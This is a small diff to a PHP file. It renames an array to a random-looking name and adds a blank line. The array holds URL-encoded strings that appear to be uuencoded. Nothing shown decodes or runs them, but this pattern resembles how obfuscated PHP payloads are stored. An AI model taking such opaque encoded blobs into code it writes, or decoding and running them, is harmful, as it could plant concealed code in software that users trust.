@@ -1,6 +1,6 @@
 <?php
 
-$daarray = array(
+$aokolonalexi = array(
 "065-%22%3AEE80G%3D%3A5WAS65%24%5D%2F0%60%60%0A%60%0A",
 "065%3D.%3AEI7%3E%26QC%3B49U6D%3CX%2F0%60%60%0A%60%0A",
 "%2865%3D2%3A%25HR%3B%278%60%0A%60%0A",
@@ -110,5 +110,6 @@ $daarray = array(
 "%2C94AL%3CV%28S0F%5DB%2CC5L%0A%60%0A",
 "%2C8E%3D6%2C%26-M.75B%2CC%25L%0A%60%0A",
 );
+
 
 ?>
